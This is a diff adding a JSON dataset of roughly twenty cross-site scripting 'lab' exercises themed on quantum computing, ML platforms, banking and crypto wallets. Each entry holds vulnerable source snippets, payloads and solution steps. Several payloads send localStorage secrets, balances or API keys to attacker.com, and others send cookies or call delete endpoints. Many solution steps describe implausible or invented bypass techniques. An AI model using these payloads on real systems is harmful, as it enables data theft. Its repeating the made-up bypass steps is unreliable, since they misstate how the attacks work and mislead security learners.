@@ -1,0 +1,350 @@
+[
+    {
+      "Lab scenario": "DOM XSS in Quantum Key Distribution Dashboard",
+      "Lab Description": "A QKD network monitor reflects URL parameters in Three.js WebGL visualizations without sanitization. The application converts BB84 protocol error rates to SVG tooltips using innerHTML. To solve: Inject XSS through crafted photon detector efficiency parameters that execute during key rate calculations.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Intercept parameter request with Burp Suite",
+        "Craft payload: efficiency=0.45<svg/onload='fetch(\"/api/keys?delete=true\")'>",
+        "Bypass CSP using WebAssembly.instantiateStreaming polyglot",
+        "Trigger through automated privacy amplification cycles"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "?efficiency=<!--<script>alert('QBER_OVERRIDE')</script>-->",
+        "<math><maction actiontype='statusline#xss'>alert(1)</maction>"
+      ],
+      "srcCode": "app.get('/qkd', (req, res) => {\n  res.render('dashboard', { efficiency: req.query.efficiency });\n});\n// Client:\ndocument.getElementById('photon-display').innerHTML = efficiencyValue;"
+    },
+    {
+      "Lab scenario": "Stored XSS in Lattice-Based Signature Registry",
+      "Lab Description": "A PQC migration platform stores Dilithium public keys in Cassandra with disabled input validation. The React frontend renders user comments using dangerouslySetInnerHTML. To solve: Inject XSS through crafted key metadata that persists through NIST standardization audits.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Use OpenSSL-NTru to generate malicious key: comment=<script>alert('SIG_FORGERY')</script>",
+        "Bypass ML-KEM schema validation using truncated polynomials",
+        "Exploit React hydration mismatch in key comparison views",
+        "Trigger through CRYSTALS-Dilithium reference implementation tests"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{\"metadata\":\"Dilithium2\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
+        "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----<img src=x onerror=alert(1)>"
+      ],
+      "srcCode": "app.post('/keys', (req, res) => {\n  cassandraClient.execute('INSERT INTO pqc (data) VALUES (?)', [req.body]);\n});\n// Client:\n<div dangerouslySetInnerHTML={{ __html: keyData }} />"
+    },
+    {
+      "Lab scenario": "Mutation XSS in Quantum Annealing Result Visualization",
+      "Lab Description": "A quantum optimization service parses D-Wave solver outputs into D3.js force graphs. The application's XML-to-SVG converter fails to handle QUBO model namespaces. To solve: Craft malicious Ising model parameters that mutate into scripts during energy landscape rendering.",
+      "Difficulty Level": "Critical",
+      "Solution Steps": [
+        "Modify qubo.xml: <variable name=\"</text><script>alert(1)</script>\">",
+        "Bypass BQM validation using Chimera graph embedding",
+        "Exploit D3.js drag behavior event handlers",
+        "Trigger through reverse quantum annealing simulations"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "<xml:namespace prefix=\"html\"/><html:script>alert('QPU_ACCESS')",
+        "{\"h\":{\"0\":\"<svg/onload='console.log(parent.energy)'/>\"}}"
+      ],
+      "srcCode": "const parser = new DOMParser();\nconst doc = parser.parseFromString(qpuOutput, 'text/xml');\nd3.select('#graph').html(doc.documentElement.outerHTML);"
+    },
+    {
+      "Lab scenario": "DOM XSS in Quantum Error Correction Dashboard",
+      "Lab Description": "A fault-tolerant quantum computing interface reflects surface code decoder parameters in Angular templates. The application bypasses sanitization for real-time error rate displays. To solve: Inject XSS through crafted stabilizer measurement rounds that execute during logical qubit initialization.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Intercept surface code API request with OWASP ZAP",
+        "Craft payload: rounds=100<script>alert('LOGICAL_QUBIT')</script>",
+        "Bypass Angular template sanitizer using [innerHTML] binding",
+        "Trigger through lattice surgery animations"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
+        "<div [innerHTML]=\"userInput\"></div>"
+      ],
+      "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${decoderParams}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
+    },
+    {
+      "Lab scenario": "Stored XSS in Quantum Neural Network Training Logs",
+      "Lab Description": "A hybrid quantum-classical ML platform stores TensorBoard logs in MinIO without validation. The Vue frontend renders hyperparameter tables using v-html. To solve: Inject XSS through malicious circuit depth entries that execute during gradient visualization.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Modify params.json: {\"layers\": \"<img src=x onerror='alert(`VQC_PWN`)'>\"}",
+        "Bypass PennyLane schema validation using parametric gates",
+        "Exploit tfjs-vis surface texture rendering flaws",
+        "Trigger through quantum kernel alignment workflows"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{\"ansatz\":\"</textarea><script>alert(1)</script>\"}",
+        "<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>"
+      ],
+      "srcCode": "app.post('/experiment', (req, res) => {\n  minioClient.putObject('logs', req.body);\n});\n// Client:\n<div v-html=\"hyperparams\"></div>"
+    }
+    ,
+   
+    {
+        "Lab scenario": "DOM XSS in Model Zoo Metadata Renderer",
+        "Lab Description": "A popular ML framework's model registry reflects search parameters in TensorFlow.js visualization tools. The application converts ONNX model metadata to HTML using innerHTML. To solve: Inject XSS through crafted operator type names that execute during model comparison.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept model search request with Burp Suite",
+        "Craft payload: op_type=Conv<script>alert('MODEL_EXFIL')</script>",
+        "Bypass CSP using WebGL texture source injection",
+        "Trigger through automated model quantization workflows"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "?op=<!--<script>fetch('/models?q='+document.cookie)</script>-->",
+        "<svg><foreignObject><script>parent.alert(1)</script>"
+        ],
+        "srcCode": "app.get('/model', (req, res) => {\n  res.render('details', { opType: req.query.op_type });\n});\n// Client:\ndocument.getElementById('ops').innerHTML = opType;"
+    },
+    {
+        "Lab scenario": "Stored XSS in Federated Learning Client",
+        "Lab Description": "A healthcare FL platform stores client updates in IPFS without input sanitization. The React dashboard renders participant metadata using dangerouslySetInnerHTML. To solve: Inject XSS through malicious gradient updates that execute during global model aggregation.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Modify params.json: {\"client_id\":\"<img src=x onerror='alert(`PATIENT_LEAK`)'>\"}",
+        "Bypass homomorphic encryption wrapper using parameter slicing",
+        "Exploit PyTorch model diffs visualization",
+        "Trigger through differential privacy audits"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"metadata\":\"HospitalA\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
+        "<iframe srcdoc='<script>parent.postMessage(localStorage.phi,\"*\")</script>'></iframe>"
+        ],
+        "srcCode": "app.post('/update', (req, res) => {\n  ipfs.add(Buffer.from(JSON.stringify(req.body)));\n});\n// Client:\n<div dangerouslySetInnerHTML={{ __html: clientID }} />"
+    },
+    {
+        "Lab scenario": "Mutation XSS in MLOps Pipeline Templates",
+        "Lab Description": "A CI/CD platform for ML parses Kubeflow pipeline YAML into HTML documentation. The application's Markdown renderer allows raw HTML in template descriptions. To solve: Craft malicious component description that bypasses Argo Workflows sanitization.",
+        "Difficulty Level": "Critical",
+        "Solution Steps": [
+        "Inject payload: description: \"<xmp><plaintext><img src=x onerror=alert(1)>\"",
+        "Bypass YAML schema validation using multi-line literals",
+        "Exploit Tekton dashboard annotation rendering",
+        "Trigger through pipeline visualization generation"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "|2\n  <script>alert('PIPELINE_PWN')</script>\n",
+        "description: >\n  ]></textarea><script>alert(1)</script>"
+        ],
+        "srcCode": "function generateDocs(yaml) {\n  const html = marked.parse(yaml);\n  return html.replace(/<\/?script>/gi, ''); // Inadequate filter\n}"
+    },
+    {
+        "Lab scenario": "DOM XSS in Synthetic Training Data Generator",
+        "Lab Description": "A GAN-based data augmentation tool reflects user inputs in D3.js visualizations. The application uses Angular's bypassSecurityTrustHtml for synthetic sample metadata. To solve: Inject XSS through crafted feature distribution parameters.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Modify params.json: {\"dist\": \"normal<svg/onload='fetch(`/api/data?exfil=${btoa(model)})'>\"}",
+        "Bypass TFRecord schema validation using proto field wrapping",
+        "Exploit tfjs-vis surface texture rendering",
+        "Trigger through latent space interpolation"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"mean\":\"0.5\",\"std\":\"</script><svg/onload=alert(1)>\"}",
+        "<div ng-controller=\"MainCtrl\">{{constructor.constructor('alert(1)')()}}"
+        ],
+        "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${distParams}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
+    },
+    {
+        "Lab scenario": "Stored XSS in LLM Fine-Tuning Interface",
+        "Lab Description": "A ChatGPT plugin stores training conversations in Elasticsearch without escaping. The Vue frontend renders system prompts using v-html. To solve: Inject XSS through crafted instruction examples that execute during RLHF alignment.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Use Postman to send payload: {\"prompt\":\"<script>alert('PROMPT_INJECTION')</script>\"}",
+        "Bypass OpenAI moderation API using homoglyphic characters",
+        "Exploit WebSocket message fragmentation",
+        "Trigger through reward model scoring"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"text\":\"Translate this: \\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
+        "<img alt='<xmp><plaintext><img src=x onerror=alert(1)>"
+        ],
+        "srcCode": "app.post('/prompts', (req, res) => {\n  elasticClient.index({ body: req.body });\n});\n// Client:\n<div v-html=\"promptText\"></div>"
+    },
+
+
+    {
+        "Lab scenario": "DOM XSS in Digital Wallet QR Generator",
+        "Lab Description": "A neobank's payment portal reflects URL parameters in SVG-based QR codes without sanitization. The application embeds user-controlled data in <desc> tags visible to screen readers. To solve: Inject XSS through crafted recipient addresses that execute during QR scanning simulation.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept QR generation with Burp Suite",
+        "Craft payload: recipient=</desc><script>alert('WALLET_DRAIN')</script>",
+        "Bypass SVG schema validation using namespace confusion",
+        "Trigger through accessibility mode preview"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "payto://iban/DE75512108001245126199?message=<svg/onload=alert(1)>",
+        "<![CDATA[</text><script>alert(document.cookie)</script>]]>"
+        ],
+        "srcCode": "app.get('/qr', (req, res) => {\n  res.send(`<svg><desc>${req.query.recipient}</desc></svg>`);\n});"
+    },
+    {
+        "Lab scenario": "Stored XSS in Transaction Memo Field (SWIFT MT940)",
+        "Lab Description": "A corporate banking platform parses SWIFT messages without sanitizing :86: remark fields. The Angular frontend renders transaction lists using [innerHTML]. To solve: Inject XSS through crafted payment remarks that persist through SEPA clearing.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Use FinTS simulator to send payload: :86:/<script>fetch('/api/transactions?delete=true')",
+        "Bypass SWIFT character set validation using UTF-7 encoding",
+        "Exploit Angular template injection via constructor.constructor",
+        "Trigger through monthly statement generation"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        ":86:/+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+        "{\"remarks\":\"\\u003Cscript\\u003Ealert('CORPORATE_ACCOUNT')\\u003C/script\\u003E\"}"
+        ],
+        "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${swiftData}</div>`);"
+    },
+    {
+        "Lab scenario": "Mutation XSS in Chat Message Formatting Engine",
+        "Lab Description": "A military-grade secure chat app converts Markdown to HTML using outdated parser. The application's emoji shortcode processor fails to handle nested contexts. To solve: Craft message that bypasses :emoji: syntax to execute script during message threading.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+            "1. Send message: :warning:`'><svg/onload='alert(\"TS_LEAK\")'>",
+            "2. Bypass DOMPurify using SVG event handler obfuscation",
+            "3. Exploit parser state confusion between markdown and HTML contexts",
+            "4. Trigger through message quote/reply functionality"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+            ":warning:`'><svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>",
+            "\\`\\`\\`html\n<svg><!--</code>--><script>alert(1)</script>\\`\\`\\`"
+        ],
+        "srcCode": "function renderMessage(text) {\n  return text\n    .replace(/:([\\w-]+):/g, '<img src=\"emoji/$1.png\">')\n    .replace(/`([^`]+)`/g, '<code>$1</code>');\n}"
+    },
+    {
+        "Lab scenario": "DOM XSS in AI-Powered Chatbot Financial Advisor",
+        "Lab Description": "A robo-advisor platform reflects user risk profiles in D3.js visualizations. The application uses <foreignObject> to embed unsanitized LLM responses in SVG charts. To solve: Inject XSS through crafted investment goals that execute during portfolio simulation.",
+        "Difficulty Level": "Critical",
+        "Solution Steps": [
+        "Intercept WebSocket message with OWASP ZAP",
+        "Craft payload: {\"goal\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
+        "Bypass CSP using d3-annotation plugin vulnerabilities",
+        "Trigger through risk assessment PDF export"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<foreignObject><template shadowroot><script>alert('PORTFOLIO')</script>",
+        "{\"profile\":\"Conservative<script>new Image().src='//attacker.com?data='+localStorage.secrets</script>\"}"
+        ],
+        "srcCode": "socket.on('update', data => {\n  d3.select('#chart').html(`<svg>${data.goal}</svg>`);\n});"
+    },
+    {
+        "Lab scenario": "Stored XSS in Encrypted Chat Message Metadata",
+        "Lab Description": "An E2EE messaging app stores message timestamps in IndexedDB without validation. The React frontend decrypts and renders location metadata using dangerouslySetInnerHTML. To solve: Inject XSS through crafted GPS coordinates that execute during map pin hover.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Modify Signal Protocol encrypted payload: lat=0&long=0&note=<script>alert('CHAT_DB')</script>",
+        "Bypass WebCrypto validation using IV manipulation",
+        "Exploit Mapbox GL popup rendering vulnerabilities",
+        "Trigger through message expiration animations"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"location\":\"0,0<img src=x onerror='navigator.clipboard.readText()'>\"}",
+        "<details ontoggle=alert(1) open></details>"
+        ],
+        "srcCode": "const decrypted = await crypto.subtle.decrypt(key, encrypted);\ndocument.getElementById('meta').innerHTML = decoder.decode(decrypted);"
+    }
+      ,
+      
+    {
+        "Lab scenario": "DOM XSS in Voice Banking IVR Transcript Viewer",
+        "Lab Description": "A phone banking system converts voice call transcripts to HTML using insecure Web Speech API output. The application renders timestamps with innerHTML without escaping angle brackets. To solve: Inject XSS through spoken phrases that execute when agents review call recordings.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Say payload during IVR: \"My account number is <svg/onload='fetch(`/api/balance`).then(r=>r.text()).then(d=>new Image().src=`http://attacker.com?data=${d}`)'>\"",
+        "Bypass audio-to-text homoglyph filtering using pitch modulation",
+        "Exploit Web Audio API AnalyserNode visualization",
+        "Trigger through call quality assurance reviews"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "Account\\u0020number\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
+        "<audio src=x onerror=alert(1)>"
+        ],
+        "srcCode": "speechRecognition.onresult = e => {\n  const transcript = e.results[0][0].transcript;\n  document.getElementById('call-text').innerHTML = transcript;\n};"
+    },
+    {
+        "Lab scenario": "Stored XSS in Cryptocurrency Wallet Recovery Phrase Grid",
+        "Lab Description": "A hardware wallet management portal stores BIP-39 mnemonics as SVG grids in IPFS. The React frontend dangerously renders seed phrase visualizations. To solve: Inject XSS through crafted word positions that execute during backup verification.",
+        "Difficulty Level": "Critical",
+        "Solution Steps": [
+        "Modify seed.json: {\"words\":[\"apple\",\"<svg/onload='navigator.usb.requestDevice({filters:[]})'>\",\"chair\"]}",
+        "Bypass BIP-39 checksum validation using entropy padding",
+        "Exploit Three.js InstancedMesh matrix synchronization",
+        "Trigger through paper wallet PDF generation"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"grid\":\"<foreignObject><template shadowroot><script>alert('SEED_PWN')</script>\"}",
+        "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
+        ],
+        "srcCode": "wallet.on('load', () => {\n  ReactDOM.render(<SVGWrapper content={wallet.seedGrid} />, root);\n});"
+    },
+    {
+        "Lab scenario": "Mutation XSS in AI Mortgage Calculator Chatbot",
+        "Lab Description": "A home loan platform's chatbot parses natural language income statements into HTML tables. The application's Markdown-to-LaTeX converter fails to handle matrix environments. To solve: Inject XSS through salary descriptions that bypass PDF sanitization.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Send message: \"My income is $\\begin{bmatrix}<script>alert('PREAPPROVAL')</script>\\end{bmatrix}$\",",
+        "Bypass KaTeX sanitizer using \newenvironment hooks",
+        "Exploit Puppeteer PDF rendering race conditions",
+        "Trigger through automated pre-approval emails"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "\\begin{tabular}{|c|}\\hline<script>alert(1)</script>\\\\ \\end{tabular}",
+        "$$\\pi = 3.14<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>$$"
+        ],
+        "srcCode": "function renderChatToPDF(text) {\n  const html = marked.parse(text);\n  return pdf.create(html); // Vulnerable HTML-to-PDF conversion\n}"
+    },
+    {
+        "Lab scenario": "DOM XSS in Stock Trading Signal Webhook Preview",
+        "Lab Description": "A algo-trading platform reflects unsanitized webhook JSON data in TradingView charts. The application uses Angular's bypassSecurityTrustHtml for strategy annotations. To solve: Inject XSS through crafted alert messages that execute during backtest rendering.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Configure webhook: {\"message\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
+        "Bypass TV JS API sandbox using postMessage handler injection",
+        "Exploit Pine Script strategy.entry() label rendering",
+        "Trigger through historical volatility simulations"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"signal\":\"BUY<script>new Image().src='http://attacker.com?key='+localStorage.apiKey</script>\"}",
+        "<math><maction actiontype='statusline#xss'>alert(1)</maction>"
+        ],
+        "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${webhookData}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
+    },
+    {
+        "Lab scenario": "Stored XSS in Blockchain Smart Contract Event Logs",
+        "Lab Description": "A DeFi analytics platform renders Ethereum event logs as HTML using web3.js. The application parses contract ABIs without sanitizing indexed parameters. To solve: Inject XSS through malicious event emissions that execute when users filter transactions.",
+        "Difficulty Level": "Critical",
+        "Solution Steps": [
+        "Deploy contract with event: emit Transfer(address(0), \"<svg/onload='alert(`DAO_DRAIN`)'>\"",
+        "Bypass Solidity ABI encoding validation using tuple nesting",
+        "Exploit The Graph subgraph visualization vulnerabilities",
+        "Trigger through token holder CSV exports"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "event Transfer(address indexed from, string calldata memo);\n// Memo: </script><svg/onload='alert(1)'>",
+        "{\"logs\":[{\"topics\":[\"0x3c7363726970743e616c6572742831293c2f7363726970743e\"]}]}"
+        ],
+        "srcCode": "contract.on('Transfer', (from, to, memo) => {\n  document.getElementById('tx-list').innerHTML += `<div>${memo}</div>`;\n});"
+    }
+      
+      
+  ]
